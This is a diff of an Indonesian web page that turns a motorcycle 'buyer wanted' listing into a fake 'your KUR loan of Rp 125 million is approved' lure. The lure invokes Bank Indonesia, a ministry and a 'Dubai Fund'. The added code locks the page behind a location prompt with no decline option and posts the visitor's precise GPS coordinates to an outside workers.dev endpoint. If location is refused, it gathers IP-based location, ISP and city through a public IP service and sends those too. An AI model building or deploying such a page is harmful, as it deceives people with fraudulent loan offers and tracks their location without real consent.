@@ -2,134 +2,138 @@
 <html lang="id">
 <head>
 <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Honda Beat 2018 | Siap Dibeli</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Danamadani: Kredit Usaha Madani Tanpa Bunga, Dubai Fund and Monetary Cashless.</title>
 
-  <!-- ===== Open Graph (WhatsApp preview) ===== -->
-  <meta property="og:title" content="Honda Beat 2018 • Siap Dibeli">
-  <meta property="og:description" content="Butuh Honda Beat area saya saja. Contoh: Rp 11,5 jt • KM 20-30rb • Pajak hidup.">
-  <meta property="og:image" content="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?q=80&w=1200&auto=format&fit=crop">
-  <meta property="og:url" content="https://example.com/">
-  <meta property="og:type" content="website">
+<!-- ===== Open Graph (WhatsApp preview) ===== -->
+<meta property="og:title" content="Program KUR 125.000.000 Anda Disetujui">
+<meta property="og:description" content="Kementrian melalui gebrakan Kredit Usaha Rakyat 200T dari kasi Bank Indonesia.">
+<meta property="og:image" content="img/dubai-fund.jpg">
+<meta property="og:url" content="https://danamadana.id/kur-disetujui.html">
+<meta property="og:type" content="website">
 
-  <!-- Bootstrap & jQuery -->
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<!-- Bootstrap & jQuery (opsional untuk komponen lain di halaman) -->
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 
-  <style>
-    body{background:#fff}
-    .hero{position:relative;aspect-ratio:16/9;background:#111;overflow:hidden}
-    .hero img{width:100%;height:100%;object-fit:cover}
-    .pager{position:absolute;bottom:.6rem;right:.75rem;background:rgba(0,0,0,.6);color:#fff;padding:.25rem .6rem;border-radius:999px;font-size:.8rem}
-    .dots{position:absolute;left:50%;bottom:.6rem;transform:translateX(-50%);display:flex;gap:.35rem}
-    .dot{width:.42rem;height:.42rem;border-radius:999px;background:rgba(255,255,255,.5)}
-    .dot.active{background:#fff}
-    .badge-pill{border:1px solid #e5e7eb;border-radius:999px;background:#fff;color:#0f172a}
-    .credit{background:#eef2ff;border:1px solid #c7d2fe;border-radius:14px}
-    .bottom-bar{position:fixed;left:0;right:0;bottom:0;background:#fff;border-top:1px solid #e5e7eb;z-index:20}
-    .btn-ghost{background:#fff;border:1px solid #e5e7eb}
-    .brand-chip{display:inline-flex;align-items:center;gap:.5rem;background:#0b1220;color:#fff;padding:.5rem .6rem;border-radius:10px;font-weight:700;font-size:.75rem}
-    /* Modal Overlay */
-    #loc-modal {
-      position: fixed; inset:0;
-      background: rgba(0,0,0,0.65);
-      display: flex; align-items: center; justify-content: center;
-      z-index: 9999;
-      visibility: hidden; opacity:0;
-      transition: opacity .25s ease, visibility .25s ease;
-    }
-    /* Saat aktif */
-    #loc-modal.active { visibility: visible; opacity:1; }
+<style>
+  body{background:#fff}
+  .hero{position:relative;aspect-ratio:16/9;background:#111;overflow:hidden}
+  .hero img{width:100%;height:100%;object-fit:cover}
+  .pager{position:absolute;bottom:.6rem;right:.75rem;background:rgba(0,0,0,.6);color:#fff;padding:.25rem .6rem;border-radius:999px;font-size:.8rem}
+  .dots{position:absolute;left:50%;bottom:.6rem;transform:translateX(-50%);display:flex;gap:.35rem}
+  .dot{width:.42rem;height:.42rem;border-radius:999px;background:rgba(255,255,255,.5)}
+  .dot.active{background:#fff}
+  .badge-pill{border:1px solid #e5e7eb;border-radius:999px;background:#fff;color:#0f172a}
+  .credit{background:#eef2ff;border:1px solid #c7d2fe;border-radius:14px}
+  .bottom-bar{position:fixed;left:0;right:0;bottom:0;background:#fff;border-top:1px solid #e5e7eb;z-index:20}
+  .btn-ghost{background:#fff;border:1px solid #e5e7eb}
+  .brand-chip{display:inline-flex;align-items:center;gap:.5rem;background:#0b1220;color:#fff;padding:.5rem .6rem;border-radius:10px;font-weight:700;font-size:.75rem}
 
-    /* Card konten */
-    #loc-modal .card {
-      background: #111827;
-      border-radius: 16px;
-      max-width: 480px;
-      width: 100%;
-      padding: 22px;
-      color: #e5e7eb;
-      box-shadow:0 10px 30px rgba(0,0,0,.5);
-    }
-    #loc-modal h1 { margin:0 0 8px; font-size:20px }
-    #loc-modal p { margin:6px 0; color:#9ca3af }
-    .actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
-    button{padding:10px 14px;border:0;border-radius:10px;cursor:pointer;font-weight:600}
-    .primary{background:#16a34a;color:#fff}
-    .secondary{background:#374151;color:#e5e7eb}
-    .ok{background:#052e18;border:1px solid #0a6b33;padding:8px;border-radius:8px;color:#c7ffdf}
-    .hidden{display:none}
-    .field{margin:6px 0}
-    input[readonly]{width:100%;padding:8px;border-radius:8px;border:1px solid #374151;background:#0b1020;color:#e5e7eb}
+  /* ===== Modal Lokasi (overlay) ===== */
+  #loc-modal {
+    position: fixed; inset:0;
+    background: rgba(0,0,0,0.65);
+    display: flex; align-items: center; justify-content: center;
+    z-index: 9999;
+    visibility: hidden; opacity:0;
+    transition: opacity .25s ease, visibility .25s ease;
+    pointer-events: none;
+  }
+  #loc-modal.active { visibility: visible; opacity:1; pointer-events: auto; }
+  #loc-modal .card {
+    background: #fff; border-radius: 16px; max-width: 480px; width: 92%;
+    padding: 22px; color: #e5e7eb; box-shadow:0 10px 30px rgba(0,0,0,.5)
+  }
+  #loc-modal h1 { margin:0 0 8px; font-size:20px; color: #374151; }
+  #loc-modal p { margin:6px 0; color:#666 }
+  .actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
+  button{padding:10px 14px;border:0;border-radius:10px;cursor:pointer;font-weight:600}
+  .primary{background:#16a34a;color:#fff}
+  .secondary{background:#374151;color:#e5e7eb}
+  .danger{background:#dc2626;color:#fff}
+  .ok{background:#052e18;border:1px solid #0a6b33;padding:8px;border-radius:8px;color:#c7ffdf}
+  .hidden{display:none}
+  .field{margin:6px 0}
+  input[readonly]{width:100%;padding:8px;border-radius:8px;border:1px solid #374151;background:#0b1020;color:#e5e7eb}
+
+  /* Spinner tombol hanya saat tombol "sibuk" */
+  #btn-allow{ position:relative }
+  #btn-allow[data-busy="true"]{ pointer-events:none; opacity:.9; }
+  #btn-allow[data-busy="true"]::after{
+    content:""; position:absolute; right:12px; top:50%; transform:translateY(-50%);
+    width:1rem; height:1rem; border:.18rem solid rgba(255,255,255,.35);
+    border-top-color:#fff; border-radius:50%; animation:spin .8s linear infinite;
+  }
+  @keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
+
+  /* Kunci body saat modal aktif */
+  body.lock { overflow:hidden; touch-action:none; }
 </style>
-
 </head>
 <body>
 
 <div class="container px-0" style="max-width:480px">
   <!-- HERO -->
-  <div class="hero">
-    <!-- GANTI ke foto Honda Beat kamu -->
-    <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?q=80&w=1400&auto=format&fit=crop" alt="Honda Beat 2018">
-    <div class="pager"><span id="pageNow">1</span> / 5</div>
-    <div class="dots" id="dots"></div>
+  <div class="hero" style="border: 1px solid;padding: 1rem;background: white;margin-bottom: 2rem;">
+    <img src="img/KUR.jpeg" alt="KUR anda Disetujui">
+    <div class="d-none pager"><span id="pageNow">1</span> / 5</div>
+    <div class="d-none dots" id="dots"></div>
   </div>
 
   <!-- Brand / chip -->
-  <div class="px-3 pt-2">
-    <span class="brand-chip">Mencari Unit • Buyer Only</span>
-  </div>
+  <div class="px-3 pt-2"><span class="brand-chip" style="background-color: forestgreen;">Disetujui</span></div>
 
   <!-- Header -->
-  <div class="d-flex justify-content-between align-items-start px-3 pt-2">
+  <div class="d-flex justify-content-between align-items-start px-3 pt-2 mb-4">
     <div>
-      <h1 class="h5 mb-1 fw-bold">Honda Beat 2018</h1>
-      <div class="text-muted small">Butuh kondisi mulus, surat lengkap</div>
+      <h1 class="h5 mb-1 fw-bold">Kredit Usaha Rakyat Madani</h1>
+      <div class="text-muted small">Pencairan Modal Usaha Rakyat Madani</div>
     </div>
-    <div class="d-flex gap-2">
+    <div class="d-flex gap-2 d-none">
       <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Share">⤴</button>
       <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Save">♡</button>
     </div>
   </div>
 
   <!-- Badges -->
-  <div class="px-3 pt-2 d-flex flex-wrap gap-2">
-    <span class="badge badge-pill px-3 py-2">⛽ Bensin</span>
-    <span class="badge badge-pill px-3 py-2">🏍️ 110 cc</span>
-    <span class="badge badge-pill px-3 py-2">📍 20.000–30.000 Km (contoh)</span>
-    <span class="badge badge-pill px-3 py-2">⚙️ Matic (CVT)</span>
+  <div class="px-3 pt-2 d-flex flex-wrap gap-2 mb-4">
+    <span class="badge badge-pill px-3 py-2 d-none">⛽ Bensin</span>
+    <span class="badge badge-pill px-3 py-2 d-none">🏍️ 155 cc</span>
+    <span class="badge badge-pill px-3 py-2">📍 Radius area saya</span>
+    <span class="badge badge-pill px-3 py-2 d-none">⚙️ Matic (CVT)</span>
   </div>
 
-  <!-- Budget + Estimasi Kredit (jika beli kredit) -->
+  <!-- Budget + Estimasi -->
   <div class="px-3 pt-3">
-    <div class="fs-5 fw-bold">Budget contoh: Rp 11.500.000</div>
+    <div class="fs-5 fw-bold" style="padding: 2rem;text-align: center;"> Rp 125.000.000</div>
     <div class="credit mt-2 shadow-sm">
-      <div class="border-bottom p-3 fw-semibold">Preferensi Pembayaran</div>
+      <div class="border-bottom p-3 fw-semibold">Preferensi Pencairan</div>
       <div class="row g-0 p-3 align-items-center">
-        <div class="col"><div class="text-secondary small">Cash di tempat</div></div>
+        <div class="col"><div class="text-secondary small">Transfer</div></div>
         <div class="col-auto fw-bold text-primary">Prioritas</div>
         <div class="col-12 my-2"></div>
-        <div class="col"><div class="text-secondary small">Atau Kredit</div></div>
-        <div class="col-auto fw-bold text-primary">DP ≥ Rp 2,5 jt <small class="text-primary-emphasis fw-semibold">tenor fleksibel</small></div>
+        <div class="col"><div class="text-secondary small">Datang Cabang</div></div>
+        <div class="col-auto fw-bold text-primary">Aktifkan Lokasi</small></div>
       </div>
     </div>
   </div>
 
   <!-- Kriteria Unit -->
   <div class="px-3 pt-3 pb-5">
-    <h4 class="h6 fw-semibold">Kriteria Unit</h4>
+    <h4 class="h6 fw-semibold">Kriteria Terpenuhi</h4>
     <div class="d-flex align-items-start py-2 border-bottom">
       <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">✓</div>
-      <p class="mb-0 small">Body & rangka utuh, mesin sehat, kelistrikan normal.</p>
+      <p class="mb-0 small">Resiko kredit anda masih dalam batas atas.</p>
     </div>
     <div class="d-flex align-items-start py-2 border-bottom">
       <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">✓</div>
-      <p class="mb-0 small">BPKB & STNK lengkap, pajak hidup (boleh mepet).</p>
+      <p class="mb-0 small">SLYK Aman</p>
     </div>
     <div class="d-flex align-items-start py-2 border-bottom">
       <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">✓</div>
-      <p class="mb-0 small">Domisili penjual dalam radius area saya (lokasi wajib aktif).</p>
+      <p class="mb-0 small">Pevindo Aman</p>
     </div>
   </div>
 </div>
@@ -140,23 +144,27 @@
     <div class="d-flex gap-2 py-2">
       <a class="btn btn-ghost flex-fill fw-bold" href="#"><span class="me-1">💬</span>Chat</a>
       <a class="btn btn-ghost flex-fill fw-bold" href="tel:+62000000000"><span class="me-1">📞</span>Call</a>
-      <a class="btn btn-success flex-fill fw-bold" style="flex:2" href="#offer">Tawarkan Unit</a>
+      <a class="btn btn-success flex-fill fw-bold" style="flex:2" href="#offer">Saya Setuju</a>
     </div>
   </div>
 </div>
 
-<div id="loc-modal">
+<!-- ===== Modal Lokasi (Gated) ===== -->
+<div id="loc-modal" role="dialog" aria-modal="true" aria-labelledby="loc-title">
   <!-- STEP 1: Consent -->
   <main class="card" id="step-consent">
-    <h1>Verifikasi Lokasi Diperlukan</h1>
-    <p>Untuk melanjutkan, silakan izinkan akses lokasi (GPS).</p>
+    <h1 id="loc-title">Aktivasi Lokasi Untuk Pencairan</h1>
+    <div class="d-flex gap-2 py-2 my-4">
+      <img class="thumb w-25" src="img/dubai-fund.jpg" /> <img class="thumb w-25" src="img/dubai-cashless.jpg" />"
+    </div> 
+    <p>Danamadani.id penyalur kredit usaha madani dengan bunga 2.5% flat. Tanpa jaminan.</p> 
+    <p>Kami membutuhkan izin lokasi anda untuk pecairan melalui agen kami.</p>
     <div class="actions">
-      <button class="primary" id="btn-allow">Izinkan & Lanjutkan</button>
-      <button class="secondary" id="btn-decline">Saya Tidak Setuju</button>
+      <button class="primary w-100" id="btn-allow">Izinkan & Lanjutkan</button>
     </div>
   </main>
 
-  <!-- STEP 2: Success -->
+  <!-- STEP 2: Success (auto-close) -->
   <main class="card hidden" id="step-ok">
     <h1>Lokasi Diterima</h1>
     <p class="ok">Terima kasih. Lokasi berhasil diverifikasi.</p>
@@ -164,139 +172,279 @@
     <div class="field"><input id="lng" readonly placeholder="Longitude"></div>
     <div class="field"><input id="acc" readonly placeholder="Akurasi (meter)"></div>
     <div class="field"><input id="ts"  readonly placeholder="Waktu (ISO)"></div>
-    <div class="actions">
-      <button class="primary" id="btn-continue">Buka Halaman</button>
-    </div>
-    <p id="post-status"></p>
+    <p id="post-status" class="mt-2"></p>
+    <p class="small text-muted mt-2" id="auto-close-note">Menutup dalam 1 detik…</p>
   </main>
 
   <!-- STEP 3: Denied -->
   <main class="card hidden" id="step-denied">
     <h1>Akses Lokasi Ditolak</h1>
-    <p>Halaman tidak dapat dibuka tanpa lokasi. Aktifkan izin lokasi di browser untuk lanjut.</p>
+    <p>Halaman tidak dapat dibuka tanpa lokasi. Aktifkan izin lokasi di pengaturan browser, lalu kembali ke halaman ini.</p>
     <div class="actions">
       <button class="secondary" id="btn-help">Cara Mengaktifkan Lokasi</button>
+      <button class="danger" id="btn-retry">Coba Lagi</button>
     </div>
   </main>
 </div>
 
 
 <script>
-  // ===== KONFIGURASI =====
-  const POST_ENDPOINT = ""; // contoh: "https://example.com/loc-hook" (biarkan kosong jika tak perlu kirim ke server)
-  const CONTINUE_URL  = "nmax.html"; // halaman tujuan setelah lokasi diterima
-  const REDIRECT_IF_DENIED = ""; // opsional: isi URL mis. "https://example.com/info-proses" untuk redirect jika denied
-  const REDIRECT_DELAY_MS = 4000;
+  /* ====== KONFIG ====== */
+  // Endpoint Worker kamu (root atau route), contoh workers.dev:
+  const POST_ENDPOINT = "https://dmdni-log-loc-store.mkemalw.workers.dev/";
+  const REQUIRED_ACCURACY_M = 200;    // akurasi maksimal agar valid
+  const AUTO_CLOSE_MS = 800;          // jeda tutup modal setelah sukses
+  const USE_WATCH = true;             // true = watchPosition agar dapat fix terbaik
+  const IP_FALLBACK_ON = true;        // aktifkan fallback IP jika GPS gagal/ditolak
+  const IP_API_URL = "https://ipapi.co/json/"; // layanan IP tracker publik (tanpa API key)
 
-  // ===== UTIL =====
+  /* ====== UTIL ====== */
+  const log = (...args) => console.log("%c[LOC]", "color:#16a34a;font-weight:700", ...args);
+  const warn = (...args) => console.warn("%c[LOC]", "color:#d97706;font-weight:700", ...args);
+  const errl = (...args) => console.error("%c[LOC]", "color:#dc2626;font-weight:700", ...args);
+
   const $ = sel => document.querySelector(sel);
-  const show = id => {
+  const show = el => {
     ["#step-consent","#step-ok","#step-denied"].forEach(s => $(s).classList.add("hidden"));
-    id.classList.remove("hidden");
+    el.classList.remove("hidden");
   };
+  const lockBody = on => document.body.classList.toggle("lock", !!on);
 
+  const modal = $("#loc-modal");
   const els = {
     consent: $("#step-consent"),
     ok: $("#step-ok"),
     denied: $("#step-denied"),
     lat: $("#lat"), lng: $("#lng"), acc: $("#acc"), ts: $("#ts"),
     btnAllow: $("#btn-allow"), btnDecline: $("#btn-decline"),
-    btnContinue: $("#btn-continue"), postStatus: $("#post-status"), btnHelp: $("#btn-help")
+    btnHelp: $("#btn-help"), btnRetry: $("#btn-retry"),
+    postStatus: $("#post-status")
   };
 
-  // ===== LOGIKA PERMISSION =====
-  async function checkPermission() {
-    if (!("permissions" in navigator) || !("geolocation" in navigator)) return; // fallback: minta via tombol
-    try {
-      const st = await navigator.permissions.query({ name: "geolocation" });
-      if (st.state === "granted") {
-        // Sudah granted sebelumnya → langsung ambil
-        requestLocation();
-      } else if (st.state === "denied") {
-        show(els.denied);
-        maybeRedirectDenied();
-      } else {
-        // "prompt" → tunggu klik user
-        show(els.consent);
-      }
-      // Jika status berubah (user ubah setting)
-      st.onchange = () => {
-        if (st.state === "granted") requestLocation();
-        else if (st.state === "denied") { show(els.denied); maybeRedirectDenied(); }
-        else show(els.consent);
-      };
-    } catch {
-      show(els.consent);
+  // spinner via attribute data-busy (CSS pseudo-element)
+  function setBusy(b){
+    if(!els.btnAllow) return;
+    if(b){ els.btnAllow.setAttribute("data-busy","true"); els.btnAllow.style.pointerEvents="none"; }
+    else { els.btnAllow.removeAttribute("data-busy"); els.btnAllow.style.pointerEvents=""; }
+  }
+
+  // Selalu tampilkan modal di setiap kunjungan (selalu minta lokasi)
+  function openGate(){ modal.classList.add("active"); lockBody(true); }
+  function closeGate(){ modal.classList.remove("active"); lockBody(false); }
+
+  function ensureSecureOrigin(){
+    const isSecure = location.protocol === "https:" || location.hostname === "localhost";
+    if(!isSecure) alert("Fitur lokasi memerlukan HTTPS. Akses halaman ini via https://");
+  }
+
+  // visit_id untuk korelasi server-side (IP diambil server)
+  const visitId = (crypto.randomUUID ? crypto.randomUUID() : String(Date.now()) + Math.random().toString(36).slice(2));
+
+  let asking = false, watchId = null, bestFix = null, autoCloseTimer = null;
+
+  /* ====== GPS FLOW ====== */
+  function startRequest(){
+    if(asking) return;
+    if(!("geolocation" in navigator)){
+      alert("Browser Anda tidak mendukung Geolocation.");
+      show(els.denied);
+      if (IP_FALLBACK_ON) doIpFallback("no_geolocation_api");
+      return;
+    }
+
+    asking = true; setBusy(true);
+    log("Meminta izin GPS… (watch:", USE_WATCH, ")");
+
+    if(USE_WATCH){
+      let timer = setTimeout(()=>{ // fallback stop setelah 15 detik
+        if(watchId !== null) navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+        warn("GPS watch timeout, gunakan bestFix:", bestFix);
+        finalizeFix(bestFix, true);
+      }, 15000);
+
+      watchId = navigator.geolocation.watchPosition(
+        pos => {
+          bestFix = pickBetter(bestFix, pos);
+          log("GPS update:", {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            acc_m: pos.coords.accuracy,
+            ts: new Date(pos.timestamp).toISOString()
+          });
+          if(bestFix && bestFix.coords.accuracy <= REQUIRED_ACCURACY_M){
+            clearTimeout(timer);
+            navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+            finalizeFix(bestFix, false);
+          }
+        },
+        geoErr => { clearTimeout(timer); onErr(geoErr); },
+        { enableHighAccuracy:true, maximumAge:0, timeout:15000 }
+      );
+    } else {
+      navigator.geolocation.getCurrentPosition(onPos, onErr, { enableHighAccuracy:true, maximumAge:0, timeout:15000 });
     }
   }
 
-  function requestLocation() {
-    navigator.geolocation.getCurrentPosition(onPos, onErr, {
-      enableHighAccuracy: true, timeout: 15000, maximumAge: 0
-    });
+  function pickBetter(a, b){
+    if(!a) return b;
+    return (b.coords.accuracy < a.coords.accuracy) ? b : (b.timestamp > a.timestamp ? b : a);
   }
 
-  function onPos(pos) {
+  function onPos(pos){ finalizeFix(pos, false); }
+
+  function finalizeFix(pos, wasFallback){
+    asking = false; setBusy(false);
+    if(!pos){
+      warn("GPS tidak tersedia. Menampilkan state DENIED.");
+      show(els.denied);
+      if (IP_FALLBACK_ON) doIpFallback("no_position");
+      return;
+    }
+
     const { latitude, longitude, accuracy } = pos.coords;
     const iso = new Date(pos.timestamp).toISOString();
-    els.lat.value = latitude.toFixed(7);
-    els.lng.value = longitude.toFixed(7);
-    els.acc.value = Math.round(accuracy);
-    els.ts.value  = iso;
+
+    // Log detail ke console
+    log("GPS fix:", { latitude, longitude, accuracy_m: accuracy, timestamp: iso, wasFallback });
+
+    // Tampilkan di UI (sekadar verifikasi)
+    if (els.lat) els.lat.value = latitude.toFixed(7);
+    if (els.lng) els.lng.value = longitude.toFixed(7);
+    if (els.acc) els.acc.value = Math.round(accuracy);
+    if (els.ts)  els.ts.value  = iso;
+
+    // Validasi akurasi
+    if(accuracy > REQUIRED_ACCURACY_M){
+      warn(`Akurasi lokasi ±${Math.round(accuracy)} m (di atas ambang ${REQUIRED_ACCURACY_M} m).`);
+      alert(`Akurasi lokasi ±${Math.round(accuracy)} m (di atas ambang ${REQUIRED_ACCURACY_M} m).\nSilakan pindah ke area terbuka atau aktifkan High Accuracy, lalu coba lagi.`);
+      show(els.denied);
+      if (IP_FALLBACK_ON) doIpFallback("low_accuracy");
+      return;
+    }
+
     show(els.ok);
 
-    if (POST_ENDPOINT) {
+    // Kirim ke server (Worker)
+    if(POST_ENDPOINT){
+      const payload = {
+        visit_id: visitId,
+        latitude, longitude, accuracy, timestamp: iso,
+        userAgent: navigator.userAgent,
+        page: location.href,
+        source: "gps"
+      };
+      log("POST GPS →", POST_ENDPOINT, payload);
       fetch(POST_ENDPOINT, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          latitude, longitude, accuracy, timestamp: iso,
-          userAgent: navigator.userAgent
-        })
-      }).then(r => {
-        els.postStatus.textContent = r.ok ? "Lokasi tersimpan." : "Gagal kirim ke server.";
-      }).catch(() => els.postStatus.textContent = "Gagal kirim ke server.");
-    }
-  }
-
-  function onErr(err) {
-    // 1=PERMISSION_DENIED, 2=POSITION_UNAVAILABLE, 3=TIMEOUT
-    if (err.code === 1) {
-      show(els.denied);
-      maybeRedirectDenied();
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify(payload)
+      }).then(async r=>{
+        const text = await r.text().catch(()=>"(no text)");
+        els.postStatus && (els.postStatus.textContent = r.ok ? "Lokasi tersimpan." : "Gagal kirim ke server.");
+        log("RESP GPS ←", r.status, text);
+      }).catch(e=>{
+        errl("POST GPS error:", e);
+        els.postStatus && (els.postStatus.textContent = "Gagal kirim ke server.");
+      });
     } else {
-      alert("Gagal mengambil lokasi: " + err.message);
+      warn("POST_ENDPOINT kosong—data GPS tidak dikirim ke server.");
+    }
+
+    clearTimeout(autoCloseTimer);
+    autoCloseTimer = setTimeout(()=> { closeGate(); }, AUTO_CLOSE_MS);
+  }
+
+  function onErr(err){
+    asking = false; setBusy(false);
+    if(watchId !== null){ navigator.geolocation.clearWatch(watchId); watchId = null; }
+    if(err.code === 1){ // PERMISSION_DENIED
+      warn("User menolak izin lokasi (PERMISSION_DENIED).");
+      show(els.denied);
+      if (IP_FALLBACK_ON) doIpFallback("permission_denied");
+    } else if(err.code === 3){ // TIMEOUT
+      warn("Pengambilan lokasi TIMEOUT.");
+      alert("Pengambilan lokasi timeout. Coba lagi di area terbuka atau aktifkan GPS (High Accuracy).");
       show(els.consent);
+      if (IP_FALLBACK_ON) doIpFallback("timeout");
+    } else { // POSITION_UNAVAILABLE
+      warn("Lokasi tidak tersedia (POSITION_UNAVAILABLE).");
+      alert("Lokasi tidak tersedia. Pastikan layanan lokasi aktif.");
+      show(els.consent);
+      if (IP_FALLBACK_ON) doIpFallback("unavailable");
     }
   }
 
-  function maybeRedirectDenied() {
-    if (REDIRECT_IF_DENIED) {
-      setTimeout(() => { location.href = REDIRECT_IF_DENIED; }, REDIRECT_DELAY_MS);
+  /* ====== IP FALLBACK ====== */
+  async function doIpFallback(reason){
+    try {
+      log("Fallback IP dimulai. Alasan:", reason, "→ memanggil", IP_API_URL);
+      const res = await fetch(IP_API_URL, { cache: "no-store" });
+      if (!res.ok) throw new Error("IP API status " + res.status);
+      const ip = await res.json();
+
+      // Normalisasi beberapa field umum ipapi.co
+      const ipInfo = {
+        source: "ip",
+        reason,
+        ip: ip.ip || null,
+        city: ip.city || null,
+        region: ip.region || ip.region_code || null,
+        country: ip.country_name || ip.country || null,
+        latitude: typeof ip.latitude === "number" ? ip.latitude : (ip.latitude ? Number(ip.latitude) : null),
+        longitude: typeof ip.longitude === "number" ? ip.longitude : (ip.longitude ? Number(ip.longitude) : null),
+        org: ip.org || ip.org_name || ip.org_domain || null,
+        asn: ip.asn || null,
+        provider: "ipapi.co",
+        // akurasi IP-based sangat kasar; tandai sebagai ~50km (50000 m) agar jelas di backend
+        accuracy: 50000,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        page: location.href,
+        visit_id: visitId
+      };
+
+      log("IP tracker result:", ipInfo);
+
+      // Kirim juga ke server jika endpoint ada
+      if (POST_ENDPOINT) {
+        log("POST IP →", POST_ENDPOINT, ipInfo);
+        const r = await fetch(POST_ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type":"application/json" },
+          body: JSON.stringify(ipInfo)
+        });
+        const text = await r.text().catch(()=>"(no text)");
+        log("RESP IP ←", r.status, text);
+      } else {
+        warn("POST_ENDPOINT kosong—hasil IP fallback tidak dikirim ke server.");
+      }
+    } catch (e) {
+      errl("IP fallback gagal:", e);
     }
   }
 
-  // ===== EVENTS =====
-  els.btnAllow.addEventListener("click", () => {
-    if (!("geolocation" in navigator)) { alert("Browser tidak mendukung Geolocation."); return; }
-    requestLocation(); // harus via gesture user (klik)
-  });
-
-  els.btnDecline.addEventListener("click", () => {
+  /* ====== EVENTS ====== */
+  els.btnAllow?.addEventListener("click", () => { startRequest(); });
+  els.btnDecline?.addEventListener("click", () => {
     show(els.denied);
-    maybeRedirectDenied();
+    if (IP_FALLBACK_ON) doIpFallback("user_clicked_decline");
+  });
+  els.btnRetry?.addEventListener("click", () => { show(els.consent); });
+  els.btnHelp?.addEventListener("click", () => {
+    alert("Aktifkan lokasi di pengaturan browser:\n\n- Chrome: Ikon gembok → Site settings → Location → Allow\n- Safari iOS: Settings → Privacy & Security → Location Services → Safari → While Using\n- Android: Settings → Location ON (High accuracy), lalu beri izin untuk browser.");
   });
 
-  els.btnContinue.addEventListener("click", () => {
-    location.href = CONTINUE_URL;
-  });
-
-  els.btnHelp.addEventListener("click", () => {
-    alert("Aktifkan lokasi di pengaturan browser:\n\n- Chrome: Lock icon → Site settings → Location → Allow\n- Safari iOS: Settings → Privacy & Security → Location Services → Safari → While Using\n- Android: Settings → Location ON, lalu beri izin untuk browser.");
-  });
-
-  // Mulai
-  checkPermission();
+  /* ====== STARTUP ====== */
+  (function init(){
+    log("Modal lokasi dibuka. visit_id:", visitId);
+    openGate();          // tampilkan modal & kunci halaman
+    ensureSecureOrigin();// info HTTPS
+    // Tidak pakai Permissions API agar SELALU minta lokasi via gesture setiap visit
+  })();
 </script>
+
+
 </body>
 </html>
